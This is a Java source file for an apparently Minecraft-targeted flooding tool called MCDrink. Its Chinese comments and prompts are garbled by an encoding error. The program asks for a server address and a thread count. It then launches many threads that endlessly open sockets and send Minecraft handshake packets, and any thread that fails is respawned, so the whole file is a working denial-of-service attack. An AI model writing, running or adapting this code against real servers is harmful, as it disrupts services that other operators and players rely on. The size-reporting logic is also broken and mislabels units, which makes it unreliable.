import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

public class main {
	public static long data=0;
	public static String[] part1;
	public static int port;
	public static void main(String[] args) {
		// TODO �Զ����ɵķ������
		System.out.println("��ӭʹ��MCDrink,����:Mr.cacti,github:https://github.com/greyCloudTeam/MCDrink,QQ:3102733279");
		System.out.println("���������mc��Э��,���ٹ���mc1.7�����ϵİ汾�ķ�����(��Ϊ1.7���°汾�ķ�����Э����ܲ�һ��),�ﵽѹ���Ŀ��");
		Scanner s=new Scanner(System.in);
		System.out.print("�����������������ַ(��127.0.0.1:25565):");
		String ip=s.nextLine();
		System.out.print("�������߳�����(����10,�߳�Խ������Խ��,�̹߳��������):");
		String threadNum=s.nextLine();
		main.part1=ip.split(":");
		main.port=Integer.parseInt(part1[1]);
		int num=Integer.parseInt(threadNum);
		System.out.println("׼�����,���������߳�,��ʱ����ʾ\"[AnotherThread]>0byte\"��Ϣ��Ϊ����ʧ��");
		Runnable thread4 = new Thread4(); 
		Thread thread3 = new Thread(thread4);
		thread3.start();//���������߳�
		for(int i=1;i<=num;i++) {
			Runnable thread1 = new Thread1(); 
			Thread thread2 = new Thread(thread1);
			thread2.start();//���������߳�
		}
		
	}
	public static int readVarInt(DataInputStream in) throws IOException {
		int i = 0;
		int j = 0;
		while (true) {
			int k = in.readByte();
			i |= (k & 0x7F) << j++ * 7;
			if (j > 5) throw new RuntimeException("VarInt too big");
			if ((k & 0x80) != 128) break;
		}
		return i;
	}
	public static void writeVarInt(DataOutputStream out, int paramInt) throws IOException {
		while (true) {
			if ((paramInt & 0xFFFFFF80) == 0) {
				out.writeByte(paramInt);
				return;
			}
			out.writeByte(paramInt & 0x7F | 0x80);
			paramInt >>>= 7;
		}
	}
}
class Thread1 implements Runnable {
	@Override
	public void run() {
		try {
			while(true) {
				Socket s=new Socket(main.part1[0],main.port);
				
				InputStream is=s.getInputStream();
				DataInputStream di=new DataInputStream(is);
				OutputStream os=s.getOutputStream();
				DataOutputStream dos=new DataOutputStream(os);
				//���ְ�������
				ByteArrayOutputStream b = new ByteArrayOutputStream();
				DataOutputStream handshake = new DataOutputStream(b);
				
				handshake.write(0x00);//������
				main.writeVarInt(handshake,-1);//�汾��δ֪
				main.writeVarInt(handshake,main.part1[0].length()); //ip��ַ����
				handshake.writeBytes(main.part1[0]); //ip
				handshake.writeShort(main.port); //port
				main.writeVarInt(handshake, 2); //state (1 for handshake)
				
				main.writeVarInt(dos, b.size()); //prepend size
				dos.write(b.toByteArray()); //write handshake packet
				
				dos.flush();
				
				//System.out.println("[DrinkThread]>handshake OK");
				//System.out.println(di.readByte());
				main.data=main.data+main.readVarInt(di);//������С,û��
				//System.out.println("[DrinkThread]>"+main.data+"byte");
				di.close();
				is.close();
				dos.close();
				os.close();
				s.close();
			}
		} catch (Exception e) {
			// TODO �Զ����ɵ� catch ��
			Runnable thread1 = new Thread1(); 
			Thread thread2 = new Thread(thread1);
			thread2.start();//����!
			System.out.println("[WARNING]�߳��Ա�,���ڸ���....");
		}
	}
}

class Thread4 implements Runnable {
	@Override
	public void run() {
		try {
			while(true) {
				Thread.sleep(3000);
				if(main.data<1024) {
					System.out.println("[AnotherThread]>"+main.data+"byte");
					continue;
				}
				if(main.data>=1024) {
					double a=main.data/1024;
					System.out.println("[AnotherThread]>"+a+"kb");
					continue;
				}
				if(main.data>=1024*1024) {
					double a=main.data/(1024*1024);
					System.out.println("[AnotherThread]>"+a+"mb");
					continue;
				}
				if(main.data>=1024*1024*1024) {
					double a=main.data/(1024*1024*1024);
					System.out.println("[AnotherThread]>"+a+"kb");
					continue;
				}
				
			}
		} catch (InterruptedException e) {
			// TODO �Զ����ɵ� catch ��
			e.printStackTrace();
		}
		
	}
}